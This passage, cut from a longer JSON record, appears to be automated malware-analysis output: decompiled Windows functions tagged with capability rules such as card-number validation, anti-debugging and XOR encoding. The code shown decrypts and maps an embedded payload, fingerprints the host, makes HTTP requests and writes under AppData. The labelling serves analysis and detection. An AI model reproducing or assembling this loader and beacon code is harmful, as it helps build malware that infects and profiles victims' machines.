        "decompiled_code": "\nulong fcn.14000181c(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    uint *puVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    bool bVar8;\n    int64_t iVar9;\n    uint32_t uVar10;\n    ulong uVar11;\n    uint8_t uVar12;\n    uint32_t uVar13;\n    uint64_t uVar14;\n    uint32_t uVar15;\n    uint64_t uVar16;\n    int64_t iStack928;\n    uint32_t auStack904 [8];\n    uchar auStack872 [678];\n    uint auStack194 [46];\n    \n    uVar14 = *(arg1 + 2);\n    iVar1 = arg1 + 0x2c6;\n    fcn.140001e48(arg1, arg2, arg3, auStack872);\n    puVar2 = (uVar14 - 0x10) + iVar1;\n    if (puVar2 != NULL) {\n        uVar5 = puVar2[1];\n        uVar6 = puVar2[2];\n        uVar7 = puVar2[3];\n        iVar9 = -iVar1 - uVar14;\n        *(puVar2 + auStack194 + iVar9 + -0x2b6) = *puVar2;\n        *(puVar2 + auStack904 + iVar9 + 0x14) = uVar5;\n        *(puVar2 + auStack904 + iVar9 + 0x18) = uVar6;\n        *(puVar2 + auStack904 + iVar9 + 0x1c) = uVar7;\n    }\n    bVar8 = false;\n    if (iVar1 == 0) {\n        return 0x4000000;\n    }\n    if (uVar14 - 0x10 < 4) {\n        return 0x4000000;\n    }\n    uVar14 = uVar14 - 0x14;\n    iStack928 = iVar1;\n    if (iVar1 == 0) {\n        if (uVar14 == 0) {\n            return 0x4000000;\n        }\n        (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        iStack928 = (*_str.0zhw)();\n        if (iStack928 == 0) {\n            return 0x4000000;\n        }\n        bVar8 = true;\n    }\n    uVar4 = *(uVar14 + iVar1);\n    uVar16 = 0;\n    if (uVar14 != 0) {\n        do {\n            uVar13 = uVar16 & 3;\n            uVar15 = (uVar16 & 0xff) + 1 & 3;\n            uVar10 = auStack904[uVar15];\n            *(uVar16 + iStack928) = *(auStack904 + uVar15) + *(auStack904 + uVar13) ^ *(uVar16 + iVar1);\n            uVar12 = uVar10 & 7;\n            uVar16 = uVar16 + 1;\n            uVar10 = (auStack904[uVar13] >> uVar12 | auStack904[uVar13] << 0x20 - uVar12) + 1;\n            auStack904[uVar13] = uVar10;\n            uVar12 = uVar10 & 7;\n            auStack904[uVar15] = (auStack904[uVar15] >> uVar12 | auStack904[uVar15] << 0x20 - uVar12) + 1;\n        } while (uVar16 < uVar14);\n    }\n    uVar10 = 0;\n    uVar16 = 0;\n    if (uVar14 != 0) {\n        do {\n            puVar3 = uVar16 + iStack928;\n            uVar16 = uVar16 + 1;\n            uVar10 = uVar10 + *puVar3;\n            uVar10 = uVar10 * 8 | uVar10 >> 0x1d;\n        } while (uVar16 < uVar14);\n    }\n    if ((uVar4 ^ auStack904[0]) != uVar10) {\n        if ((bVar8) && (iStack928 != 0)) {\n            uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11, 0, iStack928);\n        }\n        return 0x4000000;\n    }\n    uVar11 = fcn.140002420(iStack928 + 0x81, auStack872);\n    return uVar11;\n}\n",
        "token_count": 1050
    },
    "1400019d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400019dc(int64_t arg1, int16_t *arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    int16_t iVar2;\n    uint8_t *puVar3;\n    ulong uVar4;\n    uint8_t *puVar5;\n    int64_t iVar6;\n    int64_t in_R9;\n    \n    iVar2 = *arg2;\n    iVar6 = 0;\n    if (iVar2 != 0) {\n        in_R9 = arg1 - arg2;\n        do {\n            *(in_R9 + arg2) = iVar2;\n            iVar6 = iVar6 + 1;\n            arg2 = arg2 + 1;\n            iVar2 = *arg2;\n        } while (iVar2 != 0);\n    }\n    puVar3 = fcn.140001fb0(arg3, arg2, arg3, in_R9);\n    puVar5 = 0x140006168;\n    if (puVar3 != NULL) {\n        puVar5 = puVar3;\n    }\n    uVar1 = *puVar5;\n    while (uVar1 != 0) {\n        puVar5 = puVar5 + 1;\n        *(arg1 + iVar6 * 2) = *((uVar1 >> 4) + 0x1400060d0);\n        *(arg1 + 2 + iVar6 * 2) = *((uVar1 & 0xf) + 0x1400060d0);\n        iVar6 = iVar6 + 2;\n        uVar1 = *puVar5;\n    }\n    *(arg1 + iVar6 * 2) = 0;\n    if (puVar3 != NULL) {\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4, 0, puVar3);\n    }\n    return iVar6;\n}\n",
        "token_count": 427
    },
    "140001aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140001aa0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    \n    sub.msvcrt.dll_memset(&uStack296, 0, 0x11c);\n    uStack296 = 0x11c;\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x140006138);\n    pcVar4 = (*_str.__Vw)(uVar3, 0x140006158);\n    if (pcVar4 != NULL) {\n        iVar1 = (*pcVar4)(&uStack296);\n        if (iVar1 != 0) {\n            iVar1 = (*_str._tFw)(arg1, 0x140006148, 0x140006080, 0);\n            iVar5 = iVar1;\n            iVar1 = (*_str._tFw)(arg1 + iVar5 * 2, 0x140006148, 0x140006180, 0);\n            uStack284 = 0;\n            goto code_r0x000140001b76;\n        }\n    }\n    iVar1 = (*_str._tFw)(arg1, 0x140006148, 0x140006080, uStack292);\n    iVar5 = iVar1;\n    iVar1 = (*_str._tFw)(arg1 + iVar5 * 2, 0x140006148, 0x140006180, uStack288);\ncode_r0x000140001b76:\n    iVar2 = (*_str._tFw)(arg1 + (iVar5 + iVar1) * 2, 0x140006148, 0x140006180, uStack284);\n    iVar5 = iVar5 + iVar1 + iVar2;\n    iVar1 = fcn.140001bd8();\n    iVar1 = (*_str._tFw)(arg1 + iVar5 * 2, 0x140006148, 0x140006180, (-(iVar1 != 0) & 0x20U) + 0x20);\n    return iVar1 + iVar5;\n}\n",
        "token_count": 514
    },
    "140001c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140001c2c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    code *pcVar4;\n    uint32_t *puVar5;\n    uint32_t *puVar6;\n    int32_t aiStackX8 [2];\n    \n    pcVar4 = NULL;\n    puVar5 = NULL;\n    aiStackX8[0] = 0;\n    while( true ) {\n        if (pcVar4 == NULL) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x140006138);\n            pcVar4 = (*_str.__Vw)(uVar3, 0x1400060a8);\n            if (pcVar4 == NULL) goto code_r0x000140001cd5;\n        }\n        iVar1 = (*pcVar4)(5, puVar5, aiStackX8[0], aiStackX8);\n        if (iVar1 != -0x3ffffffc) break;\n        if (aiStackX8[0] == 0) {\n            return 0;\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        if (puVar5 == NULL) {\n            puVar5 = (*_str.0zhw)(uVar3, 8);\n        }\n        else {\n            puVar5 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)();\n        }\n        if (puVar5 == NULL) {\n            return 0;\n        }\n    }\n    if (iVar1 != 0) {\n        if (puVar5 == NULL) {\n            return 0;\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3, 0, puVar5);\n        return 0;\n    }\ncode_r0x000140001cd5:\n    if (puVar5 == NULL) {\n        return 0;\n    }\n    iVar1 = 1;\n    uVar2 = *puVar5;\n    puVar6 = puVar5;\n    while (uVar2 != 0) {\n        puVar6 = puVar6 + uVar2;\n        iVar1 = iVar1 + 1;\n        uVar2 = *puVar6;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3, 0, puVar5);\n    return iVar1;\n}\n",
        "token_count": 561
    },
    "140001d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140001d38(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    iVar5 = (*_str.0zhw)(uVar4, 8, 0x2001);\n    if (iVar5 != 0) {\n        iVar1 = (*_str._tFw)(iVar5, 0x140006148, 0x140006188, arg1);\n        uVar4 = 0x140006148;\n        iVar2 = (*_str._tFw)(iVar5 + iVar1 * 2, 0x140006148, 0x140006090, arg2);\n        iVar7 = iVar1 + iVar2;\n        uVar3 = fcn.140002ac8(iVar2, uVar4);\n        iVar1 = (*_str._tFw)(iVar5 + iVar7 * 2, 0x140006148, 0x140006090, uVar3);\n        iVar7 = iVar7 + iVar1;\n        uVar3 = fcn.140001c2c();\n        iVar1 = (*_str._tFw)(iVar5 + iVar7 * 2, 0x140006148, 0x140006090, uVar3);\n        iVar7 = iVar7 + iVar1;\n        iVar6 = fcn.140001aa0(iVar5 + iVar7 * 2);\n        iVar7 = iVar7 + iVar6;\n        iVar6 = fcn.1400022e8(iVar5 + iVar7 * 2);\n        iVar7 = iVar7 + iVar6;\n        iVar6 = fcn.14000218c(iVar5 + iVar7 * 2, arg3);\n        fcn.14000165c(iVar5 + (iVar7 + iVar6) * 2);\n    }\n    return iVar5;\n}\n",
        "token_count": 467
    },
    "140001fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140001fb0(ulong arg1, ulong noname_1, ulong noname_2, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    \n    iVar1 = (*_str._3Uw)();\n    uVar4 = iVar1 * 2 + 4;\n    if (uVar4 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        iVar3 = (*_str.0zhw)(uVar2, 8, uVar4 + 1);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, arg1, 0xffffffff, iVar3, uVar4, 0, 0);\n            return iVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 211
    },
    "14000203": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.140002034(ulong arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    int64_t iVar5;\n    uint auStackX24 [2];\n    uint32_t auStackX32 [2];\n    ulong nSize;\n    ulong cbSid;\n    uchar auStack136 [16];\n    uchar auStack120 [71];\n    ulong var_29h;\n    ulong lpAccountName;\n    \n    auStackX24[0] = 0x2f;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetComputerNameExW)(0, auStack120, auStackX24);\n    if ((((iVar1 != 0) &&\n         (iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameW)\n                            (0, auStack120, 0, auStackX32, auStack120, auStackX24, auStack136),  iVar1 == 0)) &&\n        (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x7a)) && (auStackX32[0] != 0)) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        iVar3 = (*_str.0zhw)(uVar2, 8, auStackX32[0] + 1);\n        if (iVar3 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameW)\n                              (0, auStack120, iVar3, auStackX32, auStack120, auStackX24, auStack136);\n            if (iVar1 != 0) {\n                puVar4 = iVar3 + 8;\n                if (*(iVar3 + 1) < arg1) {\n                    arg1._0_4_ = *(iVar3 + 1);\n                }\n                iVar5 = arg1 << 2;\n                if (((arg2 != 0) && (puVar4 != NULL)) && (arg1 != 0)) {\n                    arg2 = arg2 - puVar4;\n                    do {\n                        puVar4[arg2] = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        iVar5 = iVar5 + -1;\n                    } while (iVar5 != 0);\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2, 0, iVar3);\n                return arg1;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2, 0, iVar3);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 622
    },
    "14000242": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode * fcn.140002420(int64_t dwSize, ulong arg2)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t arg1;\n    code *pcVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    uint64_t uVar8;\n    uchar *puVar9;\n    uchar auStackX8 [8];\n    \n    arg1 = (*_str._Uw)();\n    uVar2 = 0;\n    if (arg1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        pcVar4 = uVar2 & 0xffffff | 0x5000000;\n    }\n    else {\n        uVar6 = 0;\n        if (*(dwSize + 0x1c) != 0) {\n            do {\n                iVar5 = uVar6 * 0x11;\n                puVar7 = *(iVar5 + 0x28 + dwSize) + dwSize;\n                uVar8 = *(iVar5 + 0x2c + dwSize);\n                puVar9 = *(iVar5 + 0x20 + dwSize) + arg1;\n                if ((puVar9 != NULL) && (puVar7 != NULL)) {\n                    for (; uVar8 != 0; uVar8 = uVar8 - 1) {\n                        uVar1 = *puVar7;\n                        puVar7 = puVar7 + 1;\n                        *puVar9 = uVar1;\n                        puVar9 = puVar9 + 1;\n                    }\n                }\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < *(dwSize + 0x1c));\n        }\n        iVar3 = fcn.140001504(arg1, dwSize);\n        if (iVar3 == 0) {\n            pcVar4 = 0x6000000;\n        }\n        else {\n            iVar3 = fcn.140001180(arg1, dwSize);\n            if (iVar3 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                pcVar4 = uVar2 & 0xffffff | 0x7000000;\n            }\n            else {\n                if (*(dwSize + 0x1c) != 0) {\n                    do {\n                        iVar5 = uVar2 * 0x11;\n                        (*_sym.imp.KERNEL32.dll_VirtualProtect)\n                                  (*(iVar5 + 0x20 + dwSize) + arg1, *(iVar5 + 0x24 + dwSize), *(iVar5 + 0x30 + dwSize), \n                                   auStackX8);\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < *(dwSize + 0x1c));\n                }\n                pcVar4 = *(dwSize + 0xc) + arg1;\n                if (pcVar4 != NULL) {\n                    (*pcVar4)(arg2);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    pcVar4 = uVar2 & 0xffffff | 0x8000000;\n                }\n            }\n        }\n    }\n    return pcVar4;\n}\n",
        "token_count": 716
    },
    "14000262": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140002624(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ushort uStack48;\n    uint uStack44;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    uint uStack16;\n    \n    uStack64 = 0x140006048;\n    uStack48 = 0x50;\n    uStack44 = 0;\n    uStack40 = 0;\n    uStack32 = 0;\n    uStack16 = 0;\n    uStack24 = 0;\n    uStack72 = arg1;\n    uStack56 = arg2;\n    fcn.140002720(&uStack72, arg3, arg4);\n    return;\n}\n",
        "token_count": 181
    },
    "14000267": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute anti-debugging instructions",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.140002678(int64_t arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    uint32_t *puVar2;\n    uchar *puVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    \n    uVar5 = 0x108;\n    if (*(arg2 + 0x18) == 0x10b) {\n        uVar5 = 0xf8;\n    }\n    uVar6 = 0;\n    iVar7 = uVar5 + arg2;\n    if (*(arg2 + 6) != 0) {\n        puVar2 = iVar7 + 0x10;\n        do {\n            if (((puVar2[5] & 0x20000000) != 0) && (puVar2[-2] <= *puVar2 && *puVar2 != puVar2[-2])) {\n                uVar4 = rdtsc();\n                uVar5 = *(iVar7 + 8 + uVar6 * 0x28);\n                uVar4 = (uVar4 & 0xffffffff) % (*(iVar7 + 0x10 + uVar6 * 0x28) - uVar5);\n                puVar3 = *(iVar7 + 0x14 + uVar6 * 0x28) + arg1 + uVar5;\n                *(iVar7 + 8 + uVar6 * 0x28) = uVar5 + uVar4;\n                if (uVar4 != 0) {\n                    do {\n                        uVar1 = rdtsc();\n                        *puVar3 = uVar1;\n                        puVar3 = puVar3 + 1;\n                        uVar4 = uVar4 - 1;\n                    } while (uVar4 != 0);\n                }\n                return 1;\n            }\n            uVar5 = uVar6 + 1;\n            uVar6 = uVar5;\n            puVar2 = puVar2 + 10;\n        } while (uVar5 < *(arg2 + 6));\n    }\n    return 0;\n}\n",
        "token_count": 470
    },
    "14000272": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n// WARNING: Variable defined which should be unmapped: lpBuffer\n\nuint32_t fcn.140002720(ulong *arg1, uint64_t *arg2, uint64_t *arg3)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    ulong uVar8;\n    int32_t aiStackX24 [2];\n    uint32_t auStackX32 [2];\n    ulong lpdwNumberOfBytesAvailable;\n    ulong var_58h;\n    uint64_t in_stack_ffffffffffffff98;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint64_t in_stack_ffffffffffffffa8;\n    uint64_t uStack64;\n    ulong lpBuffer;\n    ulong var_bp_8h;\n    \n    auStackX32[0] = 0xffffffff;\n    uVar7 = 0;\n    *arg2 = 0;\n    *arg3 = 0;\n    uStack64 = 0;\n    iVar4 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 0, 0, 0, in_stack_ffffffffffffff98 & 0xffffffff00000000);\n    if (iVar4 != 0) {\n        if ((arg1[6] != 0) && (*(arg1 + 7) != 0)) {\n            (*_sym.imp.WINHTTP.dll_WinHttpSetStatusCallback)(iVar4, arg1[6], *(arg1 + 7), 0);\n        }\n        iVar5 = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(iVar4, *arg1, *(arg1 + 3), 0);\n        if (iVar5 != 0) {\n            uVar8 = 0x1400060c8;\n            if (arg1[5] != 0) {\n                uVar8 = 0x1400060e8;\n            }\n            uVar10 = 0;\n            uVar9 = 0;\n            iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)\n                              (iVar5, uVar8, arg1[1], 0, 0, 0, \n                               in_stack_ffffffffffffffa8 & 0xffffffff00000000 |\n                               -(*(arg1 + 0x1c) != 0) & 0xffffffff00800000);\n            if (iVar6 != 0) {\n                if (*(arg1 + 0x1c) != 0) {\n                    (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(iVar6, 0x1f);\n                }\n                iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)\n                                  (iVar6, arg1[2], -(arg1[2] != 0), arg1[4], uVar9 & 0xffffffff00000000 | *(arg1 + 5), \n                                   uVar10 & 0xffffffff00000000 | *(arg1 + 5), 0);\n                if (iVar2 != 0) {\n                    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(iVar6, 0);\n                    if (iVar2 != 0) {\n                        aiStackX24[0] = 4;\n                        iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)\n                                          (iVar6, 0x20000013, 0, auStackX32, aiStackX24, 0);\n                        aiStackX24[0] = 8;\n                        auStackX32[0] = auStackX32[0] & -(iVar2 != 0);\n                        iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)\n                                          (iVar6, 0x20000005, 0, &uStack64, aiStackX24, 0);\n                        uStack64 = uStack64 & -(iVar2 != 0);\n                        uVar9 = uVar7;\n                        while( true ) {\n                            aiStackX24[0] = 0;\n                            iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(iVar6, aiStackX24);\n                            if ((iVar2 == 0) || (aiStackX24[0] == 0)) goto code_r0x00014000295b;\n                            uVar3 = aiStackX24[0] + 1 + uVar9;\n                            if (uVar3 == 0) break;\n                            iVar1 = uVar3 + 1;\n                            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                            if (uVar7 == 0) {\n                                uVar7 = (*_str.0zhw)(uVar8, 8, iVar1);\n                            }\n                            else {\n                                uVar7 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar8, 8, uVar7, iVar1);\n                            }\n                            if (uVar7 == 0) goto code_r0x00014000295b;\n                            iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                              (iVar6, uVar9 + uVar7, aiStackX24[0], aiStackX24);\n                            if ((iVar2 == 0) || (aiStackX24[0] == 0)) goto code_r0x00014000295b;\n                            uVar9 = uVar9 + aiStackX24[0];\n                        }\n                        uVar7 = 0;\ncode_r0x00014000295b:\n                        if ((uStack64 == 0) || (uStack64 == uVar9)) {\n                            if (uVar7 != 0) {\n                                *(uVar9 + uVar7) = 0;\n                            }\n                            *arg2 = uVar7;\n                            *arg3 = uVar9;\n                        }\n                        else {\n                            if (uVar7 != 0) {\n                                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8, 0, uVar7);\n                            }\n                            auStackX32[0] = 0xffffffff;\n                        }\n                    }\n                }\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n            }\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar5);\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar4);\n    }\n    return auStackX32[0];\n}\n",
        "token_count": 1465
    },
    "140002af": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid fcn.140002af8(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    \n    uVar1 = 0;\n    do {\n        uVar2 = uVar1 + 1;\n        (uVar1 + 0x140007000)[arg1 + -0x140006fc0] = *(uVar1 + 0x140007040) ^ *(uVar1 + 0x140007000);\n        uVar1 = uVar2;\n    } while (uVar2 < 0x20);\n    return;\n}\n",
        "token_count": 132
    },
    "14000254": {
        "rules": [
            "get common file path",
            "create directory"
        ],
        "decompiled_code": "\nvoid fcn.14000254c(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    uchar auStack280 [272];\n    \n    uVar1 = *(arg1 + 2);\n    iVar2 = (*_sym.imp.SHELL32.dll_SHGetFolderPathA)(0, 0x1a, 0, 0, auStack280);\n    uVar3 = 0x140006170;\n    if (iVar2 == 0) {\n        uVar3 = 0x140006154;\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(auStack280, uVar3);\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(auStack280, arg1 + 10);\n    (*_sym.imp.KERNEL32.dll_CreateDirectoryA)(auStack280, 0);\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(auStack280, arg1 + 0x2a);\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)(arg2, arg1 + 10);\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(arg2, arg1 + 0x2a);\n    fcn.140002394(auStack280, arg1 + 0x2c6, uVar1);\n    return;\n}\n",
        "token_count": 304
    },
    "null": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid entry0(ulong arg1)\n\n{\n    code *pcVar1;\n    ulong in_RDX;\n    \n    fcn.140002b1c(arg1, in_RDX);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 75
    }
}